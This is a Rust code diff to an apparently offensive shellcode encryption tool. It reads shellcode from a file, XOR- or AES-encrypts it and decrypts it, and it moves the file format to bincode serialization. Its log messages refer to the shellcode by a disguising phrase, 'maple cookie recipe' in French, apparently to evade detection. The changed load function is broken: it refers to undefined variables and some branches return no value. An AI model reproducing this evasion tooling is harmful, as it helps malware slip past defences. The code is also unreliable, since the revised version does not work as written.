@@ -5,6 +5,8 @@ use std::fs::OpenOptions;
 use std::io::Write;
 use std::mem;
 
+use serde_derive::{Serialize, Deserialize};
+
 use aes_gcm::{
     aead::{AeadInPlace, KeyInit, OsRng},
     Aes256Gcm, Nonce,
@@ -15,18 +17,18 @@ use rand::{
     Rng,
 };
 
-#[derive(Clone)]
+#[derive(Clone, Debug, Serialize, Deserialize)]
 pub struct ShellCode {
     pub sc: Vec<u8>,
 }
 
-#[derive(Clone)]
+#[derive(Clone, Debug, Serialize, Deserialize)]
 pub struct XoredShellCode {
     pub sc: ShellCode,
     pub xor_key: String,
 }
 
-#[derive(Clone)]
+#[derive(Clone, Debug, Serialize, Deserialize)]
 pub struct AESShellCode {
     pub sc: ShellCode,
     pub nonce: Vec<u8>,
@@ -35,7 +37,7 @@ pub struct AESShellCode {
 }
 
 impl ShellCode {
-    pub fn from_file(input_path: &str) -> ShellCode {
+    pub fn from_file(input_path: &str, mode: &str) -> ShellCode {
         let shellcode = match std::fs::read(input_path) {
             Ok(result) => result,
             Err(error) => {
@@ -44,41 +46,21 @@ impl ShellCode {
             }
         };
 
-        println!("\n\n\n{:?}", shellcode.len()); // DEBUG
-        let file_args = shellcode.split(|e| *e == 0).collect::<Vec<_>>();
-
-        if file_args.len() == 1 {
-            println!("[+] la recette des biscuits à l'érable must be raw/normal");
-            ShellCode { sc: shellcode }
-        } else if std::str::from_utf8(file_args[1]).unwrap() == "m1" {
-            println!("[+] la recette des biscuits à l'érable dectected as XOR encrypted");
-            let my_xored_shellcode = XoredShellCode {
-                sc: ShellCode {
-                    sc: file_args[3].to_vec(),
-                },
-                xor_key: std::str::from_utf8(&file_args[2]).unwrap().to_string(),
-            };
-            let decrypted_sc = my_xored_shellcode.clone().xor();
-           
-            decrypted_sc
-        } else if std::str::from_utf8(&file_args[1]).unwrap() == "m2" {
-            println!("[+] la recette du cookie à l'érable a été détectée comme étant cryptée AES");
-
-            let my_aes_shellcode = AESShellCode {
-                sc: ShellCode {
-                    sc: file_args[5].to_vec(),
-                },
-                nonce: file_args[3].to_vec(),
-                assoc_data: file_args[4].to_vec(),
-                key: file_args[2].to_vec(),
-            };
-
-            let decrypted_sc = my_aes_shellcode.decrypt();
-
-            decrypted_sc
-        } else {
-            println!("[+] la recette des biscuits à l'érable doit être brut/normal");
-            ShellCode { sc: shellcode }
+        match mode {
+            "xor" => {
+                println!("[+] la recette des biscuits à l'érable dectected as XOR encrypted");
+                let decoded_xor_object: XoredShellCode = bincode::deserialize(&shellcode).unwrap();
+                decoded_xor_object.xor();
+            },
+            "aes" => {
+                println!("[+] la recette du cookie à l'érable a été détectée comme étant cryptée AES");
+                let decoded_aes_object: AESShellCode = bincode::deserialize(&serialized_aes_object).unwrap();
+                my_aes_shellcode.decrypt();
+            },
+            "plain" => {
+                println!("[+] la recette des biscuits à l'érable must be raw/normal");
+                ShellCode{sc: shellcode}
+            }
         }
     }
 
@@ -149,6 +131,10 @@ impl XoredShellCode {
     }
 
     pub fn output_to_file(self, output_path: &str) {
+
+        let serialized_self = bincode::serialize(&self).unwrap();
+
+        println!("{:?}", serialized_self); // DEBUG
         let mut file = match OpenOptions::new()
             .write(true)
             .create_new(true)
@@ -161,15 +147,7 @@ impl XoredShellCode {
             }
         };
 
-        let mode = b"m1";
-        let mut final_output = vec![0];
-        final_output.extend(mode);
-        final_output.extend(vec![0]);
-        final_output.extend(self.xor_key.as_bytes());
-        final_output.extend(vec![0]);
-        final_output.extend(&self.sc.sc);
-
-        file.write_all(&final_output).unwrap();
+        file.write_all(&serialized_self).unwrap();
         println!("[+] wrote XOR encrypted la recette des biscuits à l'érable to {}", output_path); // TO FR
     }
 }
@@ -234,6 +212,9 @@ impl AESShellCode {
     }
 
     pub fn output_to_file(self, output_path: &str) {
+
+        let serialized_self = bincode::serialize(&self).unwrap();
+
         let mut file = match OpenOptions::new()
             .write(true)
             .create_new(true)
@@ -246,19 +227,7 @@ impl AESShellCode {
             }
         };
 
-        let mode = b"m2";
-        let mut final_output = vec![0];
-        final_output.extend(mode);
-        final_output.extend(vec![0]);
-        final_output.extend(self.key);
-        final_output.extend(vec![0]);
-        final_output.extend(&self.nonce);
-        final_output.extend(vec![0]);
-        final_output.extend(&self.assoc_data);
-        final_output.extend(vec![0]);
-        final_output.extend(&self.sc.sc);
-
-        file.write_all(&final_output).unwrap();
+        file.write_all(&serialized_self).unwrap();
         println!("[+] wrote AES encrypted la recette des biscuits à l'érable to {}", output_path); // TO FR
     }
 }
